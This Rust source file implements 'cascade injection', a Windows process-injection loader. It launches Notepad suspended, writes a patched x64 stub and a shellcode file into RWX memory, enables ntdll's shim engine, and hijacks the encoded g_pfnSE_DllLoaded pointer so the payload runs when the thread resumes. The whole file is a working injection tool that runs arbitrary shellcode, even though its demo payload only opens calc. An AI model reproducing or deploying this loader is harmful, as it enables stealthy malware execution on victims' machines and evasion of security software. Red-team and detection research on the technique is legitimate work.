extern crate winapi;
extern crate ntapi;

use std::ffi::CString;
use std::ptr::null_mut;
use winapi::ctypes::c_void;
use winapi::shared::basetsd::UINT_PTR;
use winapi::shared::minwindef::{DWORD, FALSE};
use winapi::shared::ntdef::PVOID;
use winapi::um::fileapi::{CreateFileA, GetFileSize, ReadFile, INVALID_FILE_SIZE, OPEN_EXISTING};
use winapi::um::heapapi::{GetProcessHeap, HeapAlloc, HeapFree};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
use winapi::um::winnt::{FILE_ATTRIBUTE_NORMAL, GENERIC_READ, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, IMAGE_SECTION_HEADER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::errhandlingapi::GetLastError;

type NTSTATUS = i32;


const STATUS_SUCCESS: NTSTATUS = 0x00000000;
const STATUS_UNSUCCESSFUL: NTSTATUS = 0xC0000001u32 as i32;
const STATUS_INVALID_PARAMETER: NTSTATUS = 0xC000000Du32 as i32;

struct Buffer {
    buffer: *mut u8,
    length: usize,
}

unsafe fn section_name_length(section_name: *const u8) -> usize {
    for i in 0..8 {
        if *section_name.offset(i) == 0 {
            return i as usize;
        }
    }
    8
}

unsafe fn mm_pe_section_base(module_base: PVOID, section_name: *const u8) -> PVOID {
    let dos_header = module_base as *const IMAGE_DOS_HEADER;
    if dos_header.is_null() {
        return null_mut();
    }

    let nt_header = (module_base as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    if nt_header.is_null() {
        return null_mut();
    }

    let section_header = (nt_header as usize + std::mem::size_of::<IMAGE_NT_HEADERS>()) as *const IMAGE_SECTION_HEADER;

    for i in 0..(*nt_header).FileHeader.NumberOfSections {
        let section = section_header.offset(i as isize);
        if std::ptr::eq(section, std::ptr::null()) {
            continue;
        }
        
        // Perform byte-wise comparison
        let name_ptr = (*section).Name.as_ptr();
        let name_len = section_name_length(section_name);

        if name_len > 0 && std::slice::from_raw_parts(name_ptr, name_len) == std::slice::from_raw_parts(section_name, name_len) {
            return (module_base as usize + (*section).VirtualAddress as usize) as PVOID;
        }
    }

    null_mut()
}

// fn rotr64(value: u64, shift: u64) -> u64 {
//     (value >> shift) | (value << (64 - shift))
// }


unsafe fn sys_encode_fn_pointer(fn_pointer: *const c_void) -> *mut c_void {
    let shared_user_cookie: u32 =std::ptr::read_volatile(0x7FFE0330 as *const u32);

    let encoded = ((shared_user_cookie as u64) ^ (fn_pointer as u64)).rotate_right((shared_user_cookie & 0x3F) as u32);

    encoded as *mut c_void
}

extern "C" {
    fn RtlIsZeroMemory(Destination: *const c_void, Length: usize) -> i32;
}

fn main(){

    let mut payload = Buffer {
        buffer: null_mut(),
        length: 0,
    };

    // let args: Vec<String> = std::env::args().collect();

    // if args.len() <= 2 {
    //     println!("[-] Not enough arguments");
    //     println!("[*] Example: {} [process.exe] [shellcode.bin]", args[0]);
    //     std::process::exit(1);
    // }

    // let process = &args[1];
    // let file_path = &args[2];

    let process = "Notepad.exe".to_string();
    let file_path = ".\\w64-exec-calc-shellcode.bin".to_string();

    unsafe{

        if !file_read(file_path.as_str(), &mut payload) {
            println!("[-] Failed to read file: {}", file_path);
            std::process::exit(1);
        }

        if payload.buffer.is_null() || payload.length == 0 {
            println!("[-] Payload buffer is empty or not loaded correctly");
            std::process::exit(1);
        }

        let c_process = CString::new(process.as_str()).expect("CString conversion failed");

        println!("[*] Process: {}", process);
        println!("[*] Payload @ {:?} [{:?} bytes]", payload.buffer ,payload.length);

        // let status = cascade_inject(
        //     c_process.as_ptr(), // pass process name as c-compatible string
        //     &payload,           // payload buffer
        // None,               // no context
        // );

        let status = cascade_inject(
            c_process.as_ptr() as *const i8, // pass process name as  c-compatible string
            &payload,           // payload buffer
        None,               // no context
        );

        // println!("status: {}", status);

        if status == STATUS_SUCCESS{
            println!("[+] Injection Success");
        } else {
            println!("[-] Injection Failed with status: {:?}", status);
            std::process::exit(1);
        }
    }

}

unsafe fn cascade_inject(process: *const i8, payload: &Buffer, context: Option<&Buffer>) -> NTSTATUS {
    println!("--Cascade Injection Function--");

    #[allow(non_snake_case)]
    let mut CASCADE_STUB_X64: [u8; 66] = [
        0x48, 0x83, 0xec, 0x38,                    // sub rsp, 38h
        0x33, 0xc0,                                // xor eax, eax
        0x45, 0x33, 0xc9,                          // xor r9d, r9d
        0x48, 0x21, 0x44, 0x24, 0x20,             // and [rsp+38h+var_18], rax
        0x48, 0xba,                                // mov rdx,
        0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,  // 8888888888888888h
        0xa2,                                      // mov ds:[...], al
        0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,  // 9999999999999999h
        0x49, 0xb8,                                // mov r8,
        0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,  // 7777777777777777h
        0x48, 0x8d, 0x48, 0xfe,                    // lea rcx, [rax-2]
        0x48, 0xb8,                                // mov rax,
        0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,  // 6666666666666666h
        0xff, 0xd0,                                // call rax
        0x33, 0xc0,                                // xor eax, eax
        0x48, 0x83, 0xc4, 0x38,                    // add rsp, 38h
        0xc3                                       // retn
    ];

    // Initialize process and startup information
    let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
    let mut startup_info: STARTUPINFOA = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    // Validate input parameters
    if process.is_null() || payload.buffer.is_null() {
        return STATUS_INVALID_PARAMETER;
    }

    println!("[+] Payload Check PASS");

    RtlIsZeroMemory(&mut startup_info as *mut _ as *mut c_void, std::mem::size_of::<STARTUPINFOA>());
    RtlIsZeroMemory(&mut process_info as *mut _ as *mut c_void, std::mem::size_of::<PROCESS_INFORMATION>());

    // created a process in suspended state
    let success = CreateProcessA(
        null_mut(),
        process as *mut i8,
        null_mut(),
        null_mut(),
        0,
        winapi::um::winbase::CREATE_SUSPENDED,
        null_mut(),
        null_mut(),
        &mut startup_info,
        &mut process_info,
    );

    if success == 0 {
        eprintln!("[-] CreateProcessA Failed: {:?}", GetLastError());
        return STATUS_UNSUCCESSFUL;
    }

    println!("[+] CreateProcessA Created in Suspended State");

    // calculate memory length for allocation
    let mut length = std::mem::size_of_val(&CASCADE_STUB_X64) + payload.length;
    if let Some(ctx) = context {
        length += ctx.length;
    }

    println!("[+] Length: {}", length);

    // Allocate memory in the target process
    let memory = VirtualAllocEx(
        process_info.hProcess,
        null_mut(),
        length,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
    );

    if memory.is_null() {
        eprintln!("[-] VirtualAllocEx Failed: {:?}", GetLastError());
        return STATUS_UNSUCCESSFUL;
    }

    println!("[+] VirtualAllocEx PASS: {:?}", memory);

    // Resolve .mrdata and .data sections in the current process
    let ntdll_str = CString::new("ntdll.dll").expect("CString creation failed");

    let mrdata_str = CString::new(".mrdata").expect("CString creation failed");
    let data_str = CString::new(".data").expect("CString creation failed");

    // check GetModuleHandleA Func !
    let h_module = GetModuleHandleA(ntdll_str.as_ptr());

    if h_module.is_null() {
        eprintln!("Error: Could not get module handle for ntdll.dll");
        return STATUS_UNSUCCESSFUL;
    }

    let sec_mr_data = mm_pe_section_base(
        h_module as *mut c_void, 
        mrdata_str.as_ptr() as *const u8
    );

    if sec_mr_data.is_null(){
        eprintln!("SEction Base is NULL");
        return STATUS_UNSUCCESSFUL;
    }

    let sec_data = mm_pe_section_base(
        h_module as *mut c_void, 
        data_str.as_ptr() as *const u8
    );

    if sec_data.is_null(){
        eprintln!("Sec Data is NuLL");
        return STATUS_UNSUCCESSFUL;
    }

    println!("[+] SecData: {:?}", sec_data);
    println!("[+] SecMrData: {:?}", sec_mr_data);

    let g_shims_enabled = (sec_data as usize + 0x6cf0) as *mut c_void;
    let g_pfn_se_dll_loaded = (sec_mr_data as usize + 0x270) as *mut c_void;
    
    println!("[+] Resolved .mrdata and .data sections");
    
    println!("[+] g_ShimsEnabled   : {:?}", g_shims_enabled);
    println!("[+] g_pfnSE_DllLoaded: {:?}", g_pfn_se_dll_loaded);

    // Set up cascade_stub_x64 with appropriate values

    // 1. Set the payload memory location
    #[allow(unused_assignments)]


    let mut g_value: UINT_PTR;

    // g_value = memory.wrapping_add(std::mem::size_of_val(&CASCADE_STUB_X64)) as usize;
    

    // -> Problem starts here ...!
    println!("MEMORY IN usize: {}", memory as UINT_PTR);
    g_value = (memory as usize) + CASCADE_STUB_X64.len();

    println!("[+] g_Value: {:?}", g_value);

    // println!("[+] CASCADE STUB BEFORE: {:?}", CASCADE_STUB_X64);


    std::ptr::copy_nonoverlapping(
        &g_value as *const usize as *const u8, 
        CASCADE_STUB_X64.as_mut_ptr().add(16),
        std::mem::size_of::<usize>(),
    );

    // println!("[+] CASCADE STUB: {:?}", CASCADE_STUB_X64);

    // println!("[+] 1"); // for tracking purpose

    std::ptr::copy_nonoverlapping(
        &g_shims_enabled as *const *mut c_void as *const u8, // this cast wasted me 2+ hrs :(
        CASCADE_STUB_X64.as_mut_ptr().add(25),
        std::mem::size_of::<usize>(),
    );

    // println!("[+] 2");

    // g_value 
    // g_value = (memory as usize) + std::mem::size_of_val(&CASCADE_STUB_X64) + payload.length;
    g_value = (memory as usize) + std::mem::size_of_val(&CASCADE_STUB_X64) + payload.length;


    println!("Payload.length: {}", payload.length);
    println!("New g_Value: {}", g_value);

    std::ptr::copy_nonoverlapping(
        &g_value as *const usize as *const u8,
        CASCADE_STUB_X64.as_mut_ptr().add(35),
        std::mem::size_of::<usize>(),
    );
    
    // println!("[+] 3");

    let ntqueue_str = CString::new("NtQueueApcThread").expect("Error");


    g_value = GetProcAddress(
        GetModuleHandleA(ntdll_str.as_ptr()),
        // "NtQueueApcThread\0".as_ptr() as *const i8,
        ntqueue_str.as_ptr()
    ) as UINT_PTR;

    println!("[+] Last G_value: {}", g_value);

    std::ptr::copy_nonoverlapping(
        &g_value as *const usize as *const u8,
        CASCADE_STUB_X64.as_mut_ptr().add(49), // 49
        std::mem::size_of::<usize>(),
    );


    println!("[+] Setup cascade_stub_x64 complete");

    let mut offset: u32 = 0;

    let success = WriteProcessMemory(
        process_info.hProcess,
        (memory as usize).wrapping_add(offset as usize) as *mut c_void,
        CASCADE_STUB_X64.as_ptr() as *const _,
        std::mem::size_of_val(&CASCADE_STUB_X64),
        null_mut(),
    );

    if success == 0 {
        eprintln!("[-] WriteProcessMemory for stub Failed: {:?}", GetLastError());
        return STATUS_UNSUCCESSFUL;
    }

    offset += CASCADE_STUB_X64.len() as u32; //

    let success = WriteProcessMemory(
        process_info.hProcess,
        (memory as usize).wrapping_add(offset as usize) as *mut c_void,
        payload.buffer as *const c_void,
        payload.length,
        null_mut(),
    );

    if success == 0 {
        eprintln!("[-] WriteProcessMemory for payload Failed: {:?}", GetLastError());
        return STATUS_UNSUCCESSFUL;
    }

    // check offset //
    println!("[+] Offset Before: {}", offset);

    if let Some(ctx) = context {

        offset += payload.length as u32;
        let success = WriteProcessMemory(
            process_info.hProcess,
            memory.offset(offset as isize),
            ctx.buffer as *const c_void,
            ctx.length,
            null_mut(),
        );

        if success == 0 {
            eprintln!("[-] WriteProcessMemory for context Failed: {:?}", GetLastError());
            return STATUS_UNSUCCESSFUL;
        }
    }

    println!("[+] Offset After: {}", offset);

    let shim_enabled_value = 1_u8;

    let success = WriteProcessMemory(
        process_info.hProcess,
        g_shims_enabled,
        &shim_enabled_value as *const _ as *const c_void,
        std::mem::size_of::<u8>(),
        null_mut(),
    );

    if success == 0 {
        eprintln!("[-] WriteProcessMemory for shim enable Failed: {:?}", GetLastError());
        return STATUS_UNSUCCESSFUL;
    }

    println!("[+] WriteProcessMemory for shim success: {}", success);

    // upto here works perfectly ...!

    let encoded_fn_ptr = sys_encode_fn_pointer(memory);
    
    // g_value = sys_encode_fn_pointer(memory);

    println!("[+] SysEncode Value: {:?}", encoded_fn_ptr);

    // checking mem accessability

    let mut buffer = 0u8;
    let read_success = ReadProcessMemory(
        process_info.hProcess,
        g_pfn_se_dll_loaded,
        &mut buffer as *mut _ as *mut c_void,
        std::mem::size_of::<u8>(),
        null_mut(),
    );

    if read_success == 0 {
        eprintln!("[-] ReadProcessMemory check failed for g_pfn_se_dll_loaded: {:?}", GetLastError());
        return STATUS_UNSUCCESSFUL;
    }
    println!("[+] ReadProcessMemory check passed for g_pfn_se_dll_loaded");


    let mut old_protection: DWORD = 0;
    let protect_success = VirtualProtectEx(
        process_info.hProcess,
        g_pfn_se_dll_loaded,
        std::mem::size_of::<usize>(),
        PAGE_READWRITE,
        &mut old_protection,
    );

    if protect_success == 0 {
        eprintln!("[-] VirtualProtectEx failed for g_pfn_se_dll_loaded: {:?}", GetLastError());
        return STATUS_UNSUCCESSFUL;
    }


    println!("[+] VirtualProtectEx changed protection for g_pfn_se_dll_loaded to PAGE_READWRITE");

    println!("[*] [DEBUG] Encoded function pointer: {:?}", encoded_fn_ptr);
    println!("[*] Size of encoded_fn_ptr: {:?}", std::mem::size_of_val(&encoded_fn_ptr));
    
    let success = WriteProcessMemory(
        process_info.hProcess,
        g_pfn_se_dll_loaded,
        &encoded_fn_ptr as *const _ as *const c_void,
        std::mem::size_of::<usize>(),
        null_mut(),
    );
    

    if success == 0 {
        eprintln!("[-] WriteProcessMemory for g_pfnSE_DllLoaded Failed: {:?}", GetLastError());
        return STATUS_UNSUCCESSFUL;
    }

    let result  = ResumeThread(process_info.hThread);

    if result == u32::MAX{
        println!("[-] ResumeThread Failed: {}", GetLastError());
        return STATUS_UNSUCCESSFUL;
    }

    // println!("-- cascade function executes successfully--");
    
    STATUS_SUCCESS
}

unsafe fn file_read(file_name: &str, buffer: &mut Buffer) -> bool {
    println!("--File Read Execution--");

    let mut bytes_read: DWORD = 0;
    // let mut success:bool = false;

    let c_file_name = CString::new(file_name).expect("CString::new failed");

    if file_name.is_empty() {
        println!("[-] File name is empty");
        return false;
    }

    // Attempt to open file with CreateFileA
    let file_handle = CreateFileA(
        c_file_name.as_ptr(),
        GENERIC_READ,
        0,
        null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        null_mut(),
    );

    if file_handle == INVALID_HANDLE_VALUE {
        println!("[-] CreateFileA Failed: {}", GetLastError());
        return false;
    }

    let length = GetFileSize(file_handle,  null_mut());
    if length == INVALID_FILE_SIZE {
        println!("[-] GetFileSize Failed: {}", GetLastError());
        CloseHandle(file_handle);
        return false;
    }

    let process_heap = GetProcessHeap();
    let data = HeapAlloc(process_heap, 0x00000008, length as usize) as *mut u8;
    if data.is_null() {
        println!("[-] HeapAlloc Failed: {}", GetLastError());
        CloseHandle(file_handle);
        return false;
    }

    let read_success = ReadFile(file_handle, data as *mut _, length, &mut bytes_read, null_mut());
    if read_success == FALSE || bytes_read != length {
        println!("[-] ReadFile Failed: {}", GetLastError());
        HeapFree(process_heap, 0, data as *mut _);
        CloseHandle(file_handle);
        return false;
    }

    buffer.buffer = data;
    buffer.length = length as usize;

    CloseHandle(file_handle);

    true
}
